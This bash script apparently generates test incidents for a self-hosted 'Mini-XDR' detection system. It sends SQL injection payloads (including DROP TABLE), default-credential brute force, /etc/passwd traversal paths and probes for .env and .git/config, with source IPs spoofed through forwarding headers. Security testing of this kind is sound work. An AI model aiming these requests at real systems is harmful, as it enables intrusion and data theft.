#!/bin/bash
# 🚨 Multi-IP Attack Simulation for Mini-XDR
# This script simulates attacks from different IP addresses to create multiple incidents

TARGET_IP="192.168.168.1"  # Your Mini-XDR system

# Array of fake source IPs (known malicious IPs for threat intel testing)
FAKE_IPS=(
    "185.220.101.32"    # Known Tor exit node
    "45.148.10.124"     # Known malicious IP
    "103.94.108.114"    # Suspicious IP from threat feeds
    "192.241.202.137"   # VPS often used for attacks
    "89.248.165.74"     # European suspicious IP
    "194.147.78.123"    # Another suspicious IP
    "23.129.64.218"     # US-based suspicious IP
    "178.128.83.165"    # DigitalOcean VPS (commonly abused)
)

# Malicious user agents for different attack types
USER_AGENTS=(
    "sqlmap/1.4.7#stable (http://sqlmap.org)"
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
    "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
    "Nikto/2.1.6"
    "gobuster/3.1.0"
    "Hydra v9.1 (https://github.com/vanhauser-thc/thc-hydra)"
    "python-requests/2.25.1"
    "Wget/1.20.3 (linux-gnu)"
)

echo "🚨 Multi-IP Attack Simulation for Mini-XDR"
echo "🎯 Target: $TARGET_IP"
echo "📡 Simulating attacks from ${#FAKE_IPS[@]} different IPs"
echo "⚠️  This will create multiple separate incidents!"
echo ""

# Function to perform SQL injection from a specific IP
perform_sql_attack() {
    local fake_ip=$1
    local user_agent=$2
    local attack_num=$3
    
    echo "🔥 [Attack $attack_num] SQL Injection from $fake_ip"
    
    # Multiple SQL injection payloads
    sql_payloads=(
        "'%20OR%20'1'='1"
        "'%20OR%20'1'='1'%20--"
        "admin'--"
        "'%20UNION%20SELECT%201,2,3--"
        "';%20DROP%20TABLE%20users;%20--"
    )
    
    for payload in "${sql_payloads[@]}"; do
        curl -s -A "$user_agent" \
             -H "X-Forwarded-For: $fake_ip" \
             -H "X-Real-IP: $fake_ip" \
             -H "X-Originating-IP: $fake_ip" \
             "http://$TARGET_IP/?id=$payload&search=$payload&user=$payload" > /dev/null
        echo "  └─ SQL payload: ${payload:0:20}..."
        sleep 0.5
    done
}

# Function to perform brute force from a specific IP
perform_brute_force() {
    local fake_ip=$1
    local user_agent=$2
    local attack_num=$3
    
    echo "🔐 [Attack $attack_num] Brute Force from $fake_ip"
    
    # Brute force credentials
    credentials=(
        "admin:admin"
        "admin:password"
        "admin:123456"
        "root:root"
        "administrator:password"
    )
    
    for cred in "${credentials[@]}"; do
        username=$(echo $cred | cut -d: -f1)
        password=$(echo $cred | cut -d: -f2)
        
        curl -s -X POST -A "$user_agent" \
             -H "X-Forwarded-For: $fake_ip" \
             -H "X-Real-IP: $fake_ip" \
             -H "X-Originating-IP: $fake_ip" \
             -d "username=$username&password=$password&login=Login" \
             "http://$TARGET_IP/login" > /dev/null
        echo "  └─ Login attempt: $username:$password"
        sleep 0.5
    done
}

# Function to perform directory traversal from a specific IP
perform_directory_traversal() {
    local fake_ip=$1
    local user_agent=$2
    local attack_num=$3
    
    echo "📁 [Attack $attack_num] Directory Traversal from $fake_ip"
    
    # Directory traversal payloads
    traversal_payloads=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "..%2F..%2F..%2Fetc%2Fpasswd"
        "....//....//....//etc/passwd"
    )
    
    for payload in "${traversal_payloads[@]}"; do
        curl -s -A "$user_agent" \
             -H "X-Forwarded-For: $fake_ip" \
             -H "X-Real-IP: $fake_ip" \
             -H "X-Originating-IP: $fake_ip" \
             "http://$TARGET_IP/$payload" > /dev/null
        echo "  └─ Path: ${payload:0:25}..."
        sleep 0.5
    done
}

# Function to perform reconnaissance from a specific IP
perform_reconnaissance() {
    local fake_ip=$1
    local user_agent=$2
    local attack_num=$3
    
    echo "🔍 [Attack $attack_num] Reconnaissance from $fake_ip"
    
    # Common paths to probe
    recon_paths=(
        "/admin/"
        "/phpmyadmin/"
        "/wp-admin/"
        "/.env"
        "/config.php"
        "/robots.txt"
        "/.git/config"
        "/backup.sql"
    )
    
    for path in "${recon_paths[@]}"; do
        curl -s -A "$user_agent" \
             -H "X-Forwarded-For: $fake_ip" \
             -H "X-Real-IP: $fake_ip" \
             -H "X-Originating-IP: $fake_ip" \
             "http://$TARGET_IP$path" > /dev/null
        echo "  └─ Probing: $path"
        sleep 0.3
    done
}

# Main attack loop - each IP performs different attack types
attack_counter=1
for i in "${!FAKE_IPS[@]}"; do
    fake_ip="${FAKE_IPS[$i]}"
    user_agent="${USER_AGENTS[$i]}"
    
    echo ""
    echo "🌐 ===== ATTACK SOURCE $attack_counter: $fake_ip ====="
    echo "🤖 User-Agent: ${user_agent:0:50}..."
    echo ""
    
    # Vary attack types based on IP to create diverse incidents
    case $((i % 4)) in
        0)
            perform_sql_attack "$fake_ip" "$user_agent" "$attack_counter"
            ;;
        1)
            perform_brute_force "$fake_ip" "$user_agent" "$attack_counter"
            ;;
        2)
            perform_directory_traversal "$fake_ip" "$user_agent" "$attack_counter"
            ;;
        3)
            perform_reconnaissance "$fake_ip" "$user_agent" "$attack_counter"
            ;;
    esac
    
    echo "✅ Attack $attack_counter completed from $fake_ip"
    sleep 2  # Brief pause between different IPs
    
    ((attack_counter++))
done

echo ""
echo "🎉 Multi-IP Attack Simulation Completed!"
echo ""
echo "📊 Expected Results:"
echo "   • ${#FAKE_IPS[@]} separate incidents created"
echo "   • Each incident from different source IP"
echo "   • Various attack types and risk scores"
echo "   • Multiple threat intelligence hits"
echo ""
echo "🛡️  Check Mini-XDR Dashboard:"
echo "   • URL: http://$TARGET_IP:3000"
echo "   • Look for incidents from IPs:"
for ip in "${FAKE_IPS[@]}"; do
    echo "     - $ip"
done
echo ""
echo "🎯 Test SOC Actions on different incidents:"
echo "   • Block different IPs"
echo "   • Compare threat intel results"
echo "   • Hunt for similar attack patterns"
echo "   • Test AI analysis on different incident types"

